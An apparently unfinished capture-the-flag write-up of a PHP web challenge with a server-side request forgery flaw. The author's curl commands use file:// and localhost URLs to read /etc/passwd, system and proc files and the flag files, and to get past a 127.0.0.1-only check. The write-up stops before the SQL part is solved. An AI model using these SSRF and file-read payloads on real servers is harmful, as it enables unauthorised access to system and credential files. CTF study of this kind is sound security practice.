#dHd
web chall

we are given this php source code, its a three part flag, and I only found the first two:

```php
<?php

/*
The fist part of the flag is at /flag.txt
The second part of the flag is in database, check /var/www/html/flag.php
The last part of the flag is in database
*/

if (!isset($_GET['url'])) {
    die(highlight_file(__FILE__));
}

$url = $_GET['url'];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$response = curl_exec($ch);
curl_close($ch);

echo $response;
1
```

so I went to  try to get `/flag.txt` for the first part of the flag

```shell
curl http://52.78.16.36:8913/flag.txt
curl http://52.78.16.36:8913/index.php?url=flag.txt
curl http://52.78.16.36:8913/index.php?url=/flag.txt
curl http://52.78.16.36:8913/index.php?url=./flag.txt
curl http://52.78.16.36:8913/index.php?url=../flag.txt
```
and... all nothing - we can't even find the first part of the flag

I then tried this:

```shell
curl http://52.78.16.36:8913/index.php?url=https://google.com
```

and it gave me a `301` document moved, with a hyperlink to https://google.com


Also apparently we can also do stuff like this???:
```shell
curl http://52.78.16.36:8913/index.php?url=file:///etc/passwd
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

oh wait its at the **root?**
```shell
curl http://52.78.16.36:8913/index.php?url=file:///flag.txt
The first part: 8f6d5b31
```
Alright at least we got the first part.
So I tried:
```bash
curl http://52.78.16.36:8913/index.php?url=file:///var/www/html/flag.php
```
and it gave me the result:

```php
<?php

if ($_SERVER['REMOTE_ADDR'] === "127.0.0.1") {
    if ($_SERVER['REQUEST_METHOD'] === "GET" && isset($_GET['role']) && $_GET['role'] === "admin") {
        $db = mysqli_connect('db', 'dhd', '');
        $result = mysqli_query($db, "SELECT flag FROM flag.flag WHERE id=2");
        $result = mysqli_fetch_array($result);
        echo $result[0];
    }
    else if ($_SERVER['REQUEST_METHOD'] === "POST" && isset($_POST['role']) && isset($_POST['sql']) && $_POST['role'] === "admin") {
        $db = mysqli_connect('db', 'dhd', '');
        $result = mysqli_query($db, $_POST['sql']);
        $result = mysqli_fetch_array($result);
        echo var_dump($result);
    }
}
```

from curling `index.php` instead we can see that `flag.php` and `index.php` are in the same dir

Ok anyways back to the flag.php, it seems we need to somehow fufill the `if ($_SERVER['REMOTE_ADDR'] === "127.0.0.1")` which idk how - I just naively tried:

```bash
curl http://52.78.16.36:8913/flag.php?role=admin
```
which gave me nothing. I then tried using `--interface` but I am honestly stumped:
```shell
curl --interface 52.78.16.36 http://52.78.16.36:8913/flag.php?role=admin
curl: (45) bind failed with errno 99: Cannot assign requested address
```

wait a sec are we supposed to call it using `index.php`??
```shell
curl http://52.78.16.36:8913/index.php?url=http://52.78.16.36:8913/flag.php?role=admin
curl http://52.78.16.36:8913/index.php?url=/flag.php?role=admin
```

Look at other interesting files:
```
/etc/issue
Debian GNU/Linux 11 \n \l

/etc/shadow
nothing

/etc/group
probably useless

/etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.25.0.3      e35d06f186aa

could that be a part of the flag? (it wasnt)

/etc/motd
probably useless

/etc/mysql/my.cnf
nothing

/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
nothing

/proc/version
Linux version 5.15.0-1031-aws (buildd@lcy02-amd64-016) (gcc (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #35-Ubuntu SMP Fri Feb 10 02:07:18 UTC 2023

/proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-5.15.0-1031-aws root=PARTUUID=b2e4a171-bfec-43f0-928d-f8fe44362f17 ro console=tty1 console=ttyS0 nvme_core.io_timeout=4294967295 panic=-1
```


try php filter???
```shell
curl http://52.78.16.36:8913/index.php?url=php://filter/convert.base64-encode/resource=index.php
```
nothing

try putting in `localhost` and it doesnt 301 anymore (yay)

```shell
curl http://52.78.16.36:8913/index.php?url=http://localhost
```
hmm can we access `flag.php`?

```shell
curl http://52.78.16.36:8913/index.php?url=http://localhost/flag.php?role=admin

The second part: a62ccdbb4190b
```
Alright can we somehow send a `POST` request to get our custom SQL query? hmm let's try specifying `sql` param...
```shell
curl http://52.78.16.36:8913/index.php?url=http://localhost/flag.php?role=admin&sql=SELECT+*+FROM+flag.flag
```
nope

the challenge says "The last part of the flag is in database", which isn't very specific. Do we get the database file or do we somehow trick php into doing a post request
hmm trying `method=POST`?
```shell
curl http://52.78.16.36:8913/index.php?url=http://localhost/flag.php?role=admin%26method=POST
```
nope it still gives the second part - its still treated like a `GET` req. idk.